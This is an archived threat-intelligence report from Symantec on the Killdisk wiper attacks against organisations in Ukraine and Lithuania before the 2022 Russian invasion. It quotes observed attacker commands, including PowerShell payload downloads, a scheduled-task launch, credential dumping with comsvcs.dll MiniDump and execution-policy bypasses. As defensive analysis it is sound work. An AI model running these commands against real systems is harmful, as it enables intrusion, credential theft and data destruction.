{
    "id": "3dc9af10-9674-4aee-9433-fbd8fa1b125d",
    "created_at": "2023-01-12T15:01:00.15741Z",
    "updated_at": "2025-03-27T02:05:24.393876Z",
    "deleted_at": null,
    "sha1_hash": "365344fd0c35f8176a60df3fc02c4ca767323106",
    "title": "2022-02-24 - Ukraine- Disk-wiping Attacks Precede Russian Invasion",
    "authors": "",
    "file_creation_date": "2022-05-28T23:22:00Z",
    "file_modification_date": "2022-05-28T23:22:00Z",
    "file_size": 507064,
    "plain_text": "# Ukraine: Disk-wiping Attacks Precede Russian Invasion\n\n**[symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ukraine-wiper-malware-russia](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ukraine-wiper-malware-russia)**\n\nThreat Hunter TeamSymantec\n\n**UPDATE February 24, 2022, 13:42: This blog has been updated with details about ransomware being used as a**\n_possible decoy during some wiper attacks._\n\n**UPDATE February 25, 2022, 17:00: This blog has been updated with details on how a known Microsoft SQL**\n_[Server vulnerability (CVE-2021-1636) was exploited in at least one attack.](https://support.microsoft.com/en-us/topic/kb4583456-description-of-the-security-update-for-sql-server-2017-gdr-january-12-2021-158deb0c-2050-4563-9413-d79dfc3075e2)_\n\nA new form of disk-wiping malware (Trojan.Killdisk) was used to attack organizations in Ukraine shortly before the\n[launch of a Russian invasion this morning (February 24). Symantec, a division of Broadcom Software, has also](https://software.broadcom.com/)\nfound evidence of wiper attacks against machines in Lithuania. Sectors targeted included organizations in the\nfinancial, defense, aviation, and IT services sectors.\n\nTrojan.Killdisk comes in the form of an executable file, which is signed by a certificate issued to Hermetica Digital\nLtd. It contains 32-bit and 64-bit driver files which are compressed by the Lempel-Ziv algorithm stored in their\nresource section. The driver files are signed by a certificate issued to EaseUS Partition Master. The malware will\ndrop the corresponding file according to the operating system (OS) version of the infected system. Driver file names\nare generated using the Process ID of the wiper\n\nOnce run, the wiper will damage the Master Boot Record (MBR) of the infected computer, rendering it inoperable.\nThe wiper does not appear to have any additional functionality beyond its destructive capabilities.\n\n## Attack chain\n\n\n-----\n\nInitial indications suggest that the attacks may have been in preparation for some time. Temporal evidence points to\npotentially related malicious activity beginning as early as November 2021. However, we are continuing to review\nand verify findings.\n\nIn the case of an attack against one organization in Ukraine, the attackers appear to have gained access to the\nnetwork on December 23, 2021, via malicious SMB activity against a Microsoft Exchange Server. This was\nimmediately followed by credential theft. A web shell was also installed on January 16, before the wiper was\ndeployed on February 23.\n\nAn organization in Lithuania was compromised from at least November 12, 2021, onwards. It appears the attackers\nmay have leveraged a Tomcat exploit in order to execute a PowerShell command. The decoded PowerShell was\nused to download a JPEG file from an internal server, on the victim’s network.\n\ncmd.exe /Q /c powershell -c \"(New-Object\nSystem.Net.WebClient).DownloadFile('hxxp://192.168.3.13/email.jpeg','CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1')\"\n1> \\\\127.0.0.1\\ADMIN$\\__1636727589.6007507 2>&1\n\nA minute later, the attackers created a scheduled task to execute a suspicious ‘postgresql.exe’ file, weekly on a\nWednesday, specifically at 11:05 local-time. The attackers then ran this scheduled task to execute the task.\n\ncmd.exe /Q /c move CSIDL_SYSTEM_DRIVE\\temp\\sys.tmp1\nCSIDL_WINDOWS\\policydefinitions\\postgresql.exe 1> \\\\127.0.0.1\\ADMIN$\\__1636727589.6007507 2>&1\nschtasks /run /tn \"\\Microsoft\\Windows\\termsrv\\licensing\\TlsAccess\"\n\nNine minutes later, the attackers modified the scheduled task to execute the same postgres.exe file at 09:30 localtime instead.\n\nBeginning on February 22, Symantec observed the file ‘postgresql.exe’ being executed and used to perform the\nfollowing:\n\nExecute certutil to check connectivity to trustsecpro[.]com and whatismyip[.]com\nExecute a PowerShell command to download another JPEG file from a compromised web server confluence[.]novus[.]ua\n\nFollowing this activity, PowerShell was used to dump credentials from the compromised machine:\n\ncmd.exe /Q /c powershell -c \"rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump 600\nC:\\asm\\appdata\\local\\microsoft\\windows\\winupd.log full\" 1> \\\\127.0.0.1\\ADMIN$\\__1638457529.1247072\n2>&1\n\nLater, following the above activity, several unknown PowerShell scripts were executed.\n\npowershell -v 2 -exec bypass -File text.ps1\npowershell -exec bypass gp.ps1\npowershell -exec bypass -File link.ps1\n\nFive minutes later, the wiper (Trojan.KillDisk) was deployed.\n\n## SQL Server exploit\n\n[The attackers appear to have used an exploit of a known vulnerability in Microsoft SQL Server (CVE-2021-1636) in](https://support.microsoft.com/en-us/topic/kb4583456-description-of-the-security-update-for-sql-server-2017-gdr-january-12-2021-158deb0c-2050-4563-9413-d79dfc3075e2)\norder to compromise at least one of the targeted organisations. In an attack against an organization in Ukraine, the\nfollowing process lineage was used to execute the “whoami” command on November 11 2021:\n\nCSIDL_SYSTEM_DRIVE\\program files\\microsoft sql\nserver\\mssql12.mssqlserver\\mssql\\binn\\sqlservr.exe,CSIDL_SYSTEM\\services.exe,CSIDL_SYSTEM\\wininit.exe\n\n\n-----\n\nThe next day, the same process lineage was responsible for executing the following PowerShell command:\n\n(New-Object System.Net.WebClient).DownloadFile('hxxp://[INTERNAL_HOST]/label.ico','C:\\temp\\sys.tmp1')\n\nThe organization was running an unpatched version of Microsoft SQL Server.\n\n## Ransomware decoy\n\nIn several attacks Symantec has investigated to date, ransomware was also deployed against affected organizations\nat the same time as the wiper. As with the wiper, scheduled tasks were used to deploy the ransomware. File names\nused by the ransomware included client.exe, cdir.exe, cname.exe, connh.exe, and intpub.exe. It appears likely that\nthe ransomware was used as a decoy or distraction from the wiper attacks. This has some similarities to the earlier\nWhisperGate wiper attacks against Ukraine, where the wiper was disguised as ransomware.\n\n## About the Author\n\n### Threat Hunter Team\n\n**Symantec**\n\nThe Threat Hunter Team is a group of security experts within Symantec whose mission is to investigate targeted\nattacks, drive enhanced protection in Symantec products, and offer analysis that helps customers respond to\nattacks.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-02-24 - Ukraine- Disk-wiping Attacks Precede Russian Invasion.pdf"
    ],
    "report_names": [
        "2022-02-24 - Ukraine- Disk-wiping Attacks Precede Russian Invasion.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535660,
    "ts_updated_at": 1743041124,
    "ts_creation_date": 1653780120,
    "ts_modification_date": 1653780120,
    "files": {
        "pdf": "https://archive.orkl.eu/365344fd0c35f8176a60df3fc02c4ca767323106.pdf",
        "text": "https://archive.orkl.eu/365344fd0c35f8176a60df3fc02c4ca767323106.txt",
        "img": "https://archive.orkl.eu/365344fd0c35f8176a60df3fc02c4ca767323106.jpg"
    }
}